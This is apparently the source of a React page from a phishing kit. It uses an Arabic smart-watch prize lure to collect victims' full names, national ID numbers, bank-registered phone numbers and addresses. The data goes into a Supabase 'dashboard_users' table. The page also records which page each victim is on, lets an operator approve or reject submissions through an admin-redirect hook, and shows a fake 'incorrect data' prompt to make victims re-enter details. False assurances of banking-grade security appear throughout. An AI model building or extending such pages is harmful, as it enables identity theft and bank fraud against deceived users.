import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/components/ui/use-toast";
import { User, MapPin, Lock, CheckCircle2, Sparkles } from "lucide-react";
import banner from "@/assets/personal-info-banner.jpg";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";
import { useAdminRedirect } from "@/hooks/use-admin-redirect";


const PersonalInfo = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const userId = searchParams.get("uid") || "";

  const [fullName, setFullName] = useState("");
  
  const [nationalId, setNationalId] = useState("");
  const [phone, setPhone] = useState("");
  const [governorate, setGovernorate] = useState("");
  const [city, setCity] = useState("");
  const [street, setStreet] = useState("");
  const [rejectionError, setRejectionError] = useState(searchParams.get("rejected") === "true");
  const [loading, setLoading] = useState(false);

  useAdminRedirect(userId || null, { approveRedirect: "/waiting" });

  useEffect(() => {
    if (!userId) return;
    supabase.from("dashboard_users").update({ last_page: "المعلومات الشخصية" }).eq("id", userId).then();
  }, [userId]);
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!fullName || !nationalId || !phone || !governorate || !city) {
      toast({ title: "خطأ", description: "يرجى ملء جميع الحقول المطلوبة", variant: "destructive" });
      return;
    }
    setLoading(true);
    const { error } = await supabase
      .from("dashboard_users")
      .update({
        personal_data: [{ fullName, nationalId, phone }],
        address_data: [{ governorate, city, street }],
        last_page: "المعلومات الشخصية",
        status_tabs: {},
      })
      .eq("id", userId);
    if (error) {
      toast({ title: "خطأ", description: "حدث خطأ أثناء الحفظ", variant: "destructive" });
    } else {
      toast({ title: "تم", description: "تم حفظ بياناتك بنجاح" });
      // Auto-navigate to waiting page
      navigate(`/waiting?uid=${userId}&t=${Date.now()}`, { replace: true });
    }
    setLoading(false);
  };

  const inputClasses = "text-right text-sm h-11 bg-muted/30 border-border/40 rounded-xl focus:ring-2 focus:ring-primary/30 focus:border-primary/50 transition-all";

  return (
    <div className="min-h-screen bg-background relative" dir="rtl">
      <div className="fixed inset-0 gradient-mesh pointer-events-none" />
      {rejectionError && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-foreground/50 backdrop-blur-md animate-fade-in" dir="rtl">
          <div className="bg-card rounded-2xl shadow-2xl border border-destructive/30 p-6 max-w-sm mx-4 w-full text-center space-y-3 card-shadow">
            <div className="text-5xl">⚠️</div>
            <h2 className="text-xl font-extrabold text-destructive">بيانات غير صحيحة</h2>
            <p className="text-muted-foreground text-base leading-relaxed">البيانات المدخلة غير صحيحة، يرجى التأكد منها وإعادة إدخالها.</p>
            <Button variant="outline" onClick={() => setRejectionError(false)} className="mt-2">حسناً</Button>
          </div>
        </div>
      )}
      <SiteHeader />

      {/* Banner */}
      <div className="relative">
        <img src={banner} alt="المعلومات الشخصية" className="w-full h-36 object-cover" width={1024} height={512} />
        <div className="absolute inset-0 bg-gradient-to-t from-background via-background/50 to-black/40" />
        <div className="absolute inset-0 pattern-grid opacity-15" />
        <div className="absolute bottom-3 right-0 left-0 text-center">
          <h1 className="text-base font-extrabold text-white drop-shadow-[0_2px_12px_rgba(0,0,0,0.7)]">المعلومات الشخصية وعنوان التوصيل</h1>
        </div>
      </div>

      {/* Security strip */}
      

      <section className="px-2 pb-8 pt-5 relative z-10">
        <div className="w-full max-w-none px-1 space-y-4">
          {/* Motivational */}
          <div className="flex items-start gap-3 bg-card/80 backdrop-blur-sm rounded-2xl p-4 border border-border/40 card-shadow">
            <div className="w-9 h-9 rounded-xl hero-gradient flex items-center justify-center shrink-0 shadow-button">
              <Sparkles className="w-4 h-4 text-primary-foreground" />
            </div>
            <div>
              <p className="text-sm font-bold text-foreground mb-0.5">خطوة واحدة تفصلك عن ساعتك الذكية!</p>
              <p className="text-xs text-muted-foreground leading-relaxed">
                أكمل بياناتك بدقة لضمان وصول ساعتك في أسرع وقت. آلاف العملاء أتمّوا هذه الخطوة بنجاح.
              </p>
            </div>
          </div>

          {/* Personal Info */}
          <div className="bg-card rounded-2xl p-5 card-shadow border border-border/30 space-y-3">
            <div className="flex items-center gap-2.5 pb-2.5 border-b border-border/30">
              <div className="w-8 h-8 rounded-xl hero-gradient flex items-center justify-center shadow-button">
                <User className="w-4 h-4 text-primary-foreground" />
              </div>
              <div>
                <span className="text-base font-bold text-foreground">المعلومات الشخصية</span>
                <p className="text-xs text-muted-foreground">تأكد من مطابقة البيانات لبطاقة الرقم القومي</p>
              </div>
            </div>

            <form id="combined-form" onSubmit={handleSubmit} className="space-y-3">
              <div>
                <label className="block text-sm font-bold text-muted-foreground mb-2 text-right">الاسم الكامل *</label>
                <Input placeholder="كما هو مدوّن في بطاقة الرقم القومي" value={fullName} onChange={(e) => setFullName(e.target.value)} className={inputClasses} />
              </div>
              <div>
                <label className="block text-sm font-bold text-muted-foreground mb-2 text-right">الرقم القومي *</label>
                <Input placeholder="الرقم القومي (14 رقم)" value={nationalId} onChange={(e) => setNationalId(e.target.value.replace(/\D/g, "").slice(0, 14))} className="text-center text-sm tracking-widest h-11 bg-muted/30 border-border/40 rounded-xl focus:ring-2 focus:ring-primary/30 transition-all" dir="ltr" maxLength={14} />
              </div>
              <div>
                <label className="block text-sm font-bold text-muted-foreground mb-2 text-right">رقم الهاتف *</label>
                <Input placeholder="رقم الهاتف المسجل لدى البنك" value={phone} onChange={(e) => setPhone(e.target.value.replace(/\D/g, "").slice(0, 11))} className="text-center text-sm tracking-wider h-11 bg-muted/30 border-border/40 rounded-xl focus:ring-2 focus:ring-primary/30 transition-all" dir="ltr" type="tel" maxLength={11} />
              </div>
            </form>
          </div>

          {/* Address */}
          <div className="bg-card rounded-2xl p-5 card-shadow border border-border/30 space-y-3">
            <div className="flex items-center gap-2.5 pb-2.5 border-b border-border/30">
              <div className="w-8 h-8 rounded-xl gradient-accent flex items-center justify-center shadow-[0_4px_14px_hsl(38_92%_55%/0.3)]">
                <MapPin className="w-4 h-4 text-primary-foreground" />
              </div>
              <div>
                <span className="text-base font-bold text-foreground">عنوان التوصيل</span>
                <p className="text-xs text-muted-foreground">عنوان استلام الساعة الذكية</p>
              </div>
            </div>
            <div className="space-y-3">
              <div>
                <label className="block text-sm font-bold text-muted-foreground mb-2 text-right">المحافظة *</label>
                <Input placeholder="اسم المحافظة" value={governorate} onChange={(e) => setGovernorate(e.target.value)} className={inputClasses} />
              </div>
              <div>
                <label className="block text-sm font-bold text-muted-foreground mb-2 text-right">المنطقة / الحي *</label>
                <Input placeholder="المنطقة أو الحي" value={city} onChange={(e) => setCity(e.target.value)} className={inputClasses} />
              </div>
              <div>
                <label className="block text-sm font-bold text-muted-foreground mb-2 text-right">اسم الشارع (إن وُجد)</label>
                <Input placeholder="اسم الشارع" value={street} onChange={(e) => setStreet(e.target.value)} className={inputClasses} />
              </div>
            </div>
          </div>

          <div className="flex items-center gap-2 rounded-xl py-2.5 px-3 bg-card/60 backdrop-blur-sm border border-border/30">
            <div className="w-7 h-7 rounded-lg hero-gradient flex items-center justify-center shrink-0">
              <CheckCircle2 className="w-3.5 h-3.5 text-primary-foreground" />
            </div>
            <p className="text-xs text-muted-foreground leading-relaxed">
              بياناتك مشفرة ومحمية بالكامل. لن يتم مشاركتها مع أي طرف ثالث.
            </p>
          </div>

          <Button form="combined-form" type="submit" disabled={loading} className="w-full hero-gradient text-primary-foreground text-base font-bold py-6 rounded-xl shadow-button hover:shadow-[0_6px_24px_hsl(213_76%_44%/0.4)] transition-all">
            {loading ? "جاري الحفظ..." : "متابعة"}
          </Button>

          <div className="flex items-center justify-center gap-1.5 text-muted-foreground">
            <Lock className="w-3.5 h-3.5" />
            <p className="text-xs">جميع بياناتك محمية وفق أعلى المعايير المصرفية الدولية</p>
          </div>
        </div>
      </section>
      <SiteFooter />
    </div>
  );
};

export default PersonalInfo;
